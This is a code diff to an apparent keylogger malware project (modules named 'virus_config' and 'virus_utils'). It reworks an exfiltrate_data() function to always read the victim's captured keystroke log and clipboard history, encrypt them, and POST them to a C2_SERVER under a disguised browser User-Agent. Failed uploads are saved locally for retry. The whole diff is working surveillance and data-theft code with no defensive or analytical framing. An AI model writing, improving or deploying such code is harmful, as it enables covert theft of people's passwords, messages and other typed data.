@@ -7,6 +7,7 @@ import time
 import sys
 import urllib.request
 import urllib.parse
+import urllib.error
 import hashlib
 from virus_config import *
 from virus_utils import log_activity, encrypt_data
@@ -80,25 +81,76 @@ def exfiltrate_data():
         if 'config_files' not in data_package:
             data_package['config_files'] = collect_all_config_files()
         
-        # All logs merged into keyboard_log.txt
-        data_package['keyboard_logs'] = []
-        data_package['activity_logs'] = []  # Keep for compatibility, but same as keyboard_logs
-        data_package['clipboard_history'] = []
-        
-        # Read merged log file (keyboard_log.txt contains all activity)
+        # KEYBOARD LOGS - ALWAYS read directly from keyboard_log.txt file (FRESH DATA)
+        # Never use normalized_data.json for keyboard logs - it's stale
+        # Read the latest keyboard_log.txt every time to get all new keystrokes
+        keyboard_logs_content = ""
         log_file = f"{DATA_DIR}/{LOG_FILE}"
+        
+        # ALWAYS read directly from keyboard_log.txt to get the latest keystrokes
         if os.path.exists(log_file):
             try:
-                with open(log_file, 'r', encoding='utf-8') as f:
-                    content = f.read()
-                    # Both keyboard_logs and activity_logs point to same merged log
-                    log_content = content[-10000:] if len(content) > 10000 else content
-                    data_package['keyboard_logs'] = log_content
-                    data_package['activity_logs'] = log_content  # Same content, merged
+                with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    keyboard_logs_content = f.read()
+                    log_activity("EXFILTRATION", f"✅ KEYBOARD LOGS read from {log_file}: {len(keyboard_logs_content)} chars, {keyboard_logs_content.count(chr(10))} lines")
+            except Exception as e:
+                log_activity("EXFILTRATION", f"❌ Error reading keyboard logs from {log_file}: {e}")
+                keyboard_logs_content = ""
+        else:
+            log_activity("EXFILTRATION", f"⚠️  Keyboard log file not found: {log_file}")
+            # Try alternative path (if DATA_DIR doesn't exist yet)
+            alt_log_file = LOG_FILE
+            if os.path.exists(alt_log_file):
+                try:
+                    with open(alt_log_file, 'r', encoding='utf-8', errors='ignore') as f:
+                        keyboard_logs_content = f.read()
+                        log_activity("EXFILTRATION", f"✅ KEYBOARD LOGS read from {alt_log_file}: {len(keyboard_logs_content)} chars")
+                except Exception as e:
+                    log_activity("EXFILTRATION", f"❌ Error reading from {alt_log_file}: {e}")
+        
+        # ALWAYS set keyboard logs in data package (even if empty)
+        # This ensures keyboard_logs are sent with every exfiltration
+        data_package['keyboard_logs'] = keyboard_logs_content
+        data_package['activity_logs'] = keyboard_logs_content  # Same content, merged
+        data_package['keyboard_logs_size'] = len(keyboard_logs_content)
+        data_package['keyboard_logs_lines'] = keyboard_logs_content.count('\n')
+        
+        # Log final status with verification
+        if keyboard_logs_content:
+            log_activity("EXFILTRATION", f"✅ KEYBOARD LOGS ready to send: {len(keyboard_logs_content)} chars, {keyboard_logs_content.count(chr(10))} lines")
+            # Verify it's actually in data_package
+            if 'keyboard_logs' in data_package and data_package['keyboard_logs']:
+                log_activity("EXFILTRATION", f"✅ Verified: keyboard_logs in data_package ({len(data_package['keyboard_logs'])} chars)")
+            else:
+                log_activity("EXFILTRATION", f"❌ WARNING: keyboard_logs NOT in data_package!")
+        else:
+            log_activity("EXFILTRATION", f"⚠️  No keyboard logs to send (file empty or not found)")
+        
+        # Clipboard history
+        data_package['clipboard_history'] = []
+        
+        # Also include clipboard history if available
+        clipboard_file = f"{DATA_DIR}/clipboard_history.txt"
+        if os.path.exists(clipboard_file):
+            try:
+                with open(clipboard_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    clipboard_content = f.read()
+                    data_package['clipboard_history'] = clipboard_content.split('\n') if clipboard_content else []
+                    data_package['clipboard_history_size'] = len(clipboard_content)
             except:
                 pass
         
+        # Verify keyboard logs are in data package before encryption
+        if 'keyboard_logs' in data_package:
+            kb_size = len(data_package['keyboard_logs']) if isinstance(data_package['keyboard_logs'], str) else 0
+            log_activity("EXFILTRATION", f"📦 Data package contains keyboard_logs: {kb_size} chars")
+        else:
+            log_activity("EXFILTRATION", f"❌ WARNING: keyboard_logs missing from data_package before encryption!")
+        
         encrypted_payload = encrypt_data(json.dumps(data_package))
+        
+        # Log size of encrypted payload
+        log_activity("EXFILTRATION", f"📦 Encrypted payload size: {len(encrypted_payload)} bytes")
         
         try:
             payload = {
@@ -110,13 +162,28 @@ def exfiltrate_data():
             data = urllib.parse.urlencode(payload).encode()
             req = urllib.request.Request(C2_SERVER, data=data, method='POST')
             req.add_header('User-Agent', 'Mozilla/5.0')
+            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
             
-            with urllib.request.urlopen(req, timeout=10) as response:
-                log_activity("EXFILTRATION", f"Data sent successfully: {len(encrypted_payload)} bytes")
-        except Exception as e:
+            with urllib.request.urlopen(req, timeout=30) as response:
+                response_data = response.read().decode('utf-8', errors='ignore')
+                log_activity("EXFILTRATION", f"Data sent successfully to {C2_SERVER}: {len(encrypted_payload)} bytes")
+                log_activity("EXFILTRATION", f"Server response: {response_data[:200]}")
+        except urllib.error.URLError as e:
+            log_activity("EXFILTRATION", f"Connection error to {C2_SERVER}: {e}")
+            # Save to pending upload file for retry
             try:
                 with open(EXFILTRATION_FILE, 'w') as f:
-                    json.dump(data_package, f)
+                    json.dump(data_package, f, indent=2)
+                log_activity("EXFILTRATION", f"Data saved to {EXFILTRATION_FILE} for retry")
+            except:
+                pass
+        except Exception as e:
+            log_activity("EXFILTRATION", f"Error sending data to {C2_SERVER}: {type(e).__name__}: {e}")
+            # Save to pending upload file for retry
+            try:
+                with open(EXFILTRATION_FILE, 'w') as f:
+                    json.dump(data_package, f, indent=2)
+                log_activity("EXFILTRATION", f"Data saved to {EXFILTRATION_FILE} for retry")
             except:
                 pass
     except:
